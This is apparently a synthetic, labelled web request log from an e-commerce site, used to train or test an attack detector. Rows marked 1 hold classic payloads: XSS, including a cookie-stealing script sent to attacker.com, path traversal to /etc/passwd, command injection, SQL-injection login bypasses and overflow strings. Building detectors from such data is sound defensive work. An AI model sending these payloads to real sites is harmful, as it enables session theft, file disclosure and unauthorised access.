+07:56:34.9,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:56:37.1,10.0.0.106,POST,/auth/register,"{'csrf_token': 'ImC27mmKxdQoFNbOMEGwZhih9QH694dLH4YOffhVu4'.BKjhvdOw.o8mEAgOrUdhY7MJ8qDgkA5gAFee8, 'username': 'newuser2', 'email': 'a78@b.com', 'password': 'Z3OaIf0bxwL3', 'submit': 'Register'}",0
+07:56:39.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:56:41.1,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:56:43.3,10.0.0.28,GET,/order/cart,,0
+07:56:44.9,192.168.1.165,GET,/order/myorders,,0
+07:56:47.6,192.168.1.185,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:56:49.2,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImhOufLuYnH4l11Z2kd0Cv2250nS3lnqCpFhV1vJwa'.B2KjAwy3.Q9-G2SrVjRhcH7Ic1I5HueTdcjqL, 'username': 'newuser61', 'email': 'a40@b.com', 'password': '3Ne7Rc1iy$yQ', 'submit': 'Register'}",0
+07:56:51.1,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:56:52.9,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:56:55.7,192.168.1.165,GET,/product/1,,0
+07:56:57.2,192.168.1.162,GET,/auth/login,,0
+07:56:59.5,10.0.0.28,GET,/,,0
+07:57:01.2,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:57:03.1,10.0.0.146,POST,/auth/register,"{'csrf_token': 'ImQTuuUnpvKIMSKWED8T4eONruWwk3YqU65smWxd0b'.3VW77zwM.ymTPW4UF89yufaPhFSgj06wCoApW, 'username': 'newuser54', 'email': 'a21@b.com', 'password': 'UqLxsCjfqzH(', 'submit': 'Register'}",0
+07:57:04.8,192.168.1.185,GET,/auth/register,,0
+07:57:07.7,192.168.1.141,GET,/product/1,,0
+07:57:09.4,192.168.1.182,GET,/order/cart,,0
+07:57:11.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:57:12.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:57:15.4,10.0.0.82,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:57:17.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:57:19.0,10.0.0.106,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:57:21.2,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImThnciGCu1yV8qXV3L8dl5buEB0KjVQPlQ0SLW7Hf'.qgUTnPAc.w9p2n9aGjU_7JpqpPNcTtM6OzPvI, 'username': 'user13', 'password': ')6u@!Kv2G7Em', 'submit': 'Log in'}",0
+07:57:23.3,10.0.0.176,GET,/product/2,,0
+07:57:25.5,192.168.1.182,GET,/order/cart,,0
+07:57:26.8,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:57:29.5,192.168.1.46,GET,/auth/register,,0
+07:57:31.2,192.168.1.167,GET,/auth/logout,,0
+07:57:33.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:57:34.9,192.168.1.182,GET,/product/2,,0
+07:57:37.2,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:57:39.5,192.168.1.165,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:57:41.3,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:57:43.5,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:57:45.7,192.168.1.169,GET,/,,0
+07:57:47.7,10.0.0.79,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:57:49.3,192.168.1.175,GET,/,,0
+07:57:50.8,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:57:53.2,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:57:55.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:57:57.7,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:57:58.9,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:58:00.9,192.168.1.12,GET,/product/2,,0
+07:58:03.3,203.162.4.191,GET,/category/Iphone,,0
+07:58:05.6,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:58:07.0,10.0.0.176,POST,/auth/register,"{'csrf_token': 'Im7m4RhJWRxEIqVNZW5DUHN0Ix7m2hrLEYHHtl7A3e'.4lmytq00.AdIKcubv7JPHsdqTWwoL5uoBAIKu, 'username': 'newuser23', 'email': 'a27@b.com', 'password': 'I&Q3@yIOmlDy', 'submit': 'Register'}",0
+07:58:09.1,10.0.0.82,GET,/,,0
+07:58:11.6,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:58:13.4,192.168.1.50,GET,/auth/register,,0
+07:58:15.0,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:58:16.9,192.168.1.162,GET,/auth/login,,0
+07:58:19.1,192.168.1.167,POST,/auth/register,"{'csrf_token': 'ImyOVSABp9yqT9FbICEKjT5wLB2xdg2zIzSR92GtYt'.vhf2IUM0.9hXJ5zk_NU4AwqAnk_f3072QnYjX, 'username': 'newuser39', 'email': 'a33@b.com', 'password': 'B3bCDAQo1())', 'submit': 'Register'}",0
+07:58:20.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:58:23.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:58:25.5,192.168.1.104,GET,/auth/logout,,0
+07:58:26.8,192.168.1.151,POST,/search,{'query': 'iphone 15 pro max'},0
+07:58:28.8,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:58:31.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:58:33.5,192.168.1.12,GET,/auth/logout,,0
+07:58:35.4,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:58:37.6,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:58:39.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:58:41.4,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:58:43.7,192.168.1.165,GET,/auth/logout,,0
+07:58:44.9,192.168.1.18,GET,/product/2,,0
+07:58:47.1,192.168.1.162,GET,/auth/login,,0
+07:58:48.8,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:58:51.6,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
+07:58:53.5,10.0.0.176,POST,/auth/register,"{'csrf_token': 'ImsOChrnfBtFWCTly7jancP9F1ONdW4DYTNjF6TpQS'.4NJyWFde.-9kHlY1vY1ALQhsZHuvc7r7EoJ2c, 'username': 'newuser65', 'email': 'a5@b.com', 'password': 'TN(ELipu^ipW', 'submit': 'Register'}",0
+07:58:55.5,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:58:57.5,10.0.0.28,GET,/order/myorders,,0
+07:58:59.6,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:59:01.3,192.168.1.165,GET,/order/cart,,0
+07:59:03.3,192.168.1.167,GET,/product/2,,0
+07:59:05.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:59:06.8,192.168.1.165,POST,/auth/register,"{'csrf_token': 'ImQPWxS7223XdWicYoB3COC2XyjS2VfXVNP9APQ6aM'.0PJvjlRQ.jazNAn8PB2zNsbimzprqEUrhEvj-, 'username': 'newuser51', 'email': 'a47@b.com', 'password': 'FwWQG^$8sjYe', 'submit': 'Register'}",0
+07:59:09.6,192.168.1.50,GET,/order/cart,,0
+07:59:11.5,192.168.1.50,GET,/category/Iphone,,0
+07:59:12.8,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:59:14.8,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:59:17.6,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:59:19.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:59:21.3,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:59:23.7,192.168.1.144,GET,/product/2,,0
+07:59:25.7,10.0.0.176,POST,/auth/login,"{'csrf_token': 'ImW64cdw59BHb9VYxmiDoGwiV2NqQweMHAeclTA5Sl'.uijx0OBB.-iQ7DIAp3Gf3wFPWQ1YTkbfVPHp4, 'username': 'user52', 'password': 'z!deQRS9c*Ra', 'submit': 'Log in'}",0
+07:59:27.3,192.168.1.104,GET,/order/cart,,0
+07:59:29.7,192.168.1.55,GET,/order/myorders,,0
+07:59:31.7,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Imb8m5ePTV8uqC1KZUidifnUxHFivQsulIMXgrKVsW'.Lruom4ND.HuSDAm5FDH5WtK24Wfptri8__WPJ, 'username': 'newuser26', 'email': 'a11@b.com', 'password': '^XLAQmVHcJoX', 'submit': 'Register'}",0
+07:59:33.3,10.0.0.15,GET,/order/myorders,,0
+07:59:35.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:59:37.4,192.168.1.167,GET,/order/cart,,0
+07:59:39.3,192.168.1.28,GET,/,,0
+07:59:41.1,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:59:43.3,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImtDnzlr3F6CSLeHaeEfRwleCFrGFsOTW5nCnFwmd2'.MY0tJSvq.lErJWwogkgevk8SmE317MhZvwZZx, 'username': 'user21', 'password': 'BfvqQZGtrHNy', 'submit': 'Log in'}",0
+07:59:45.3,192.168.1.162,GET,/auth/login,,0
+07:59:47.7,192.168.1.56,GET,/,,0
+07:59:49.2,192.168.1.55,GET,/order/cart,,0
+07:59:51.4,10.0.0.146,GET,/category/Iphone,,0
+07:59:53.5,10.0.0.146,GET,/category/Iphone,,0
+07:59:54.8,203.162.4.190,GET,/product/1,,0
+07:59:57.6,192.168.1.182,GET,/category/Iphone,,0
+07:59:59.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:00:01.3,192.168.1.162,POST,/auth/login,"{'csrf_token': 'Im2HMzXWrl9flcT0OjVXh76CUJUZ54nv3p9XL0zzV2'.LuyKBci0.sOi95VKQBI6B-F-LeHMKz8wPyynV, 'username': 'user36', 'password': '6@n2sOTBpBNe', 'submit': 'Log in'}",0
+08:00:02.9,10.0.0.15,GET,/order/myorders,,0
+08:00:05.6,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:00:07.5,10.0.0.106,GET,/order/cart,,0
+08:00:09.2,192.168.1.162,GET,/auth/register,,0
+08:00:10.8,192.168.1.197,GET,/auth/logout,,0
+08:00:12.8,203.162.4.191,GET,/order/myorders,,0
+08:00:14.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:00:17.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:00:18.9,192.168.1.18,GET,/,,0
+08:00:21.5,192.168.1.22,GET,/order/myorders,,0
+08:00:23.2,203.162.4.191,GET,/../../../../etc/passwd,,1
+08:00:24.8,192.168.1.185,GET,/product/2,,0
+08:00:27.2,192.168.1.141,GET,/order/myorders,,0
+08:00:29.2,203.162.4.190,GET,/product/1' AND 1=1,,1
+08:00:31.1,10.0.0.67,GET,/,,0
+08:00:33.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:00:35.5,10.0.0.28,GET,/auth/register,,0
+08:00:37.0,192.168.1.169,GET,/auth/logout,,0
+08:00:38.9,192.168.1.50,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:00:40.9,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
+08:00:43.4,192.168.1.144,GET,/product/2,,0
+08:00:44.8,192.168.1.169,POST,/auth/register,"{'csrf_token': 'Imh0TyskIMw7Iue44AtGwgO0kzdsqIhbNuucfucK2n'.zgyoRjuo.k6cnJ5klqutEflb2JGc-3HCheVzN, 'username': 'newuser25', 'email': 'a84@b.com', 'password': 'P#1AL*D9KtLh', 'submit': 'Register'}",0
+08:00:47.3,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:00:49.4,192.168.1.22,GET,/auth/login,,0
+08:00:51.5,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:00:52.8,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:00:55.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+08:00:57.4,192.168.1.50,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:00:59.6,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:01:01.2,10.0.0.146,GET,/product/1,,0
+08:01:03.2,127.0.0.1,GET,/auth/register,,0
+08:01:05.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:01:07.2,203.162.4.190,GET,/../../../../etc/passwd,,1
+08:01:09.5,192.168.1.46,GET,/product/2,,0
+08:01:11.3,203.162.4.191,GET,/../../../../etc/passwd,,1
+08:01:13.5,10.0.0.28,GET,/product/2,,0
+08:01:14.9,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImDQTzM7U2L6BQfWTt4nywAb7HGlBVgPsAH1MZ9o7O'.RCmVTS8K.JarFYJ97k9zwxFsqOBYowacy2Nmi, 'username': 'user74', 'password': 'tVNqDhKSJrQ6', 'submit': 'Log in'}",0
+08:01:17.5,203.162.4.190,GET,/category/Iphone,,0
+08:01:19.0,192.168.1.104,GET,/,,0
+08:01:21.6,192.168.1.28,GET,/,,0
+08:01:23.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:01:24.9,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+08:01:26.8,192.168.1.165,GET,/category/Iphone,,0
+08:01:29.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+08:01:31.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:01:33.3,10.0.0.82,GET,/order/myorders,,0
+08:01:35.4,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:01:37.4,192.168.1.162,POST,/auth/login,"{'csrf_token': 'ImydaH7Jag6cxQzzsnYxUdys2iexVcm8DBZJgZF4eG'.vHzTeRIy.mZ3wahiLrxrAooUxsxV-S0N6zpq9, 'username': 'user20', 'password': '8dR^essM^*A1', 'submit': 'Log in'}",0
+08:01:39.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:01:41.1,192.168.1.55,POST,/auth/register,"{'csrf_token': 'Im2l1ofMgIrlDVUao5PaqHrh0NNuXyew4Q9yNrQedQ'.YO2FCwJ7.sPIN4he93cqRj3uTgqss9dXMjNmf, 'username': 'newuser2', 'email': 'a41@b.com', 'password': '0ZS&^nlQZ#*n', 'submit': 'Register'}",0
+08:01:42.9,10.0.0.79,POST,/search,{'query': 'iphone 15 pro max'},0
+08:01:45.2,10.0.0.146,GET,/order/cart,,0
+08:01:46.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:01:49.3,192.168.1.141,GET,/auth/logout,,0
+08:01:51.0,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+08:01:52.8,192.168.1.151,GET,/order/myorders,,0
+08:01:54.9,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImEVuTKmRax5eOKx6ZnJmwni83wVMv6GezW0sHiNXw'.8e609MSc.bK9qDLxEk0d-0qOn1eUF3ivOSnhh, 'username': 'newuser49', 'email': 'a7@b.com', 'password': 'TFtnacK3wBp3', 'submit': 'Register'}",0
+08:01:57.2,203.162.4.190,POST,/auth/login,"{'csrf_token': 'Imys19FFUBYjDOLDLeHE0zKnvsoMXs4wuYNMvYPoiU'.hCiX2O9r.SdZRmDRglN1nXIRlgsdvB6_V9Et9, 'username': 'user26', 'password': 'E^OiOuq5lD(x', 'submit': 'Log in'}",0
+08:01:58.8,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImhKPncFYqv1oXGgoBxasZ7QW5cS7HNC2AzA9d5iRs'.X74Q8AhC.aUdYWbgRUoWrQDyj-luFmX2Qafs6, 'username': 'newuser9', 'email': 'a54@b.com', 'password': '%zkBzAODhp16', 'submit': 'Register'}",0
+08:02:00.9,192.168.1.56,GET,/order/myorders,,0
+08:02:02.8,203.162.4.191,GET,/product/1' AND 1=1,,1
+08:02:05.6,192.168.1.169,GET,/category/Iphone,,0
+08:02:07.0,10.0.0.195,GET,/product/1,,0
+08:02:09.1,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImP9o7YqZYh1EseygWR6IrbyefnkWUwo5yFY4jYNH0'.00Ln6hGA.ABsrlCHKuHmXZYLuG_XGS0DTEq96, 'username': 'user57', 'password': '!g&ztjTQ)q^O', 'submit': 'Log in'}",0
+08:02:11.2,192.168.1.182,GET,/,,0
+08:02:12.7,192.168.1.167,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:02:14.9,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:02:17.5,103.75.118.228,GET,/product/1' AND 1=1,,1
+08:02:19.5,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:02:21.3,192.168.1.56,POST,/auth/register,"{'csrf_token': 'Imk8RCsdp3WSHkdCKlVj6gI7CpvDP7e03kMoezz6gg'.fDFJkoGO.L2IEv6nXmP2HaOYifIFRZ322SJld, 'username': 'newuser74', 'email': 'a35@b.com', 'password': '$TRAsXO%X699', 'submit': 'Register'}",0
+08:02:22.8,10.0.0.176,GET,/order/cart,,0
+08:02:25.1,203.162.4.191,GET,/product/1' AND 1=1,,1
+08:02:26.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:02:29.6,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
+08:02:31.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:02:33.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:02:35.2,10.0.0.82,POST,/search,{'query': 'iphone 15 pro max'},0
+08:02:37.3,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:02:39.0,203.162.4.191,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:02:41.7,192.168.1.169,POST,/auth/login,"{'csrf_token': 'Im7PcUdC7OXsp8jlZo49Ng4TcP82mBb4kOA5OtbEhZ'.cUM2f8Is.FOg5aIUn5A8Msg8fN7FD4AphkYkM, 'username': 'user47', 'password': 'Umpx(V$Eohjb', 'submit': 'Log in'}",0
+08:02:43.0,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+08:02:45.6,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+08:02:47.3,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
+08:02:48.9,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:02:51.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:02:53.4,10.0.0.82,GET,/auth/login,,0
+08:02:55.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+08:02:57.6,192.168.1.175,GET,/auth/register,,0
+08:02:59.0,10.0.0.195,GET,/product/1,,0
+08:03:01.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:03:03.5,192.168.1.141,POST,/auth/register,"{'csrf_token': 'Im7xQY64ZnAzbjeL8EyVLLOQ9IIbMb6hpupovDfD1o'.5RsKbShy.98wGt1DkxEYEmVOozOEL-r1S8SgA, 'username': 'newuser14', 'email': 'a35@b.com', 'password': '!AYCGg5VfcAG', 'submit': 'Register'}",0
+08:03:04.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:03:07.2,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:03:08.9,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+08:03:11.3,192.168.1.182,GET,/,,0
+08:03:13.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:03:14.8,192.168.1.22,GET,/product/2,,0
+08:03:16.9,192.168.1.50,GET,/order/cart,,0
+08:03:19.0,10.0.0.195,POST,/auth/login,"{'csrf_token': 'Imwk4a2XPicPHmfJZjrdw0fIUHu7TRptalJvbGzrzk'.yso2wVoT.0wVZwUeC3QI1rfsOlT8U-5-MoR8a, 'username': 'user84', 'password': 'WVbjSFzYOe!8', 'submit': 'Log in'}",0
+08:03:21.0,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImFqT1JcVMGsg94GL22wHvt7EBWcJraSo5tLy7nBz5'.ex5jJkjh.Vm0jNVwL9WwRPfWn0vaNVkq7fg5r, 'username': 'user37', 'password': 'SVQwh^blGCSq', 'submit': 'Log in'}",0
+08:03:23.0,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:03:24.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+08:03:27.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+08:03:29.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+08:03:31.7,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:03:32.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+08:03:35.6,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+08:03:37.3,192.168.1.12,GET,/order/myorders,,0
+08:03:39.3,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+08:03:41.3,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
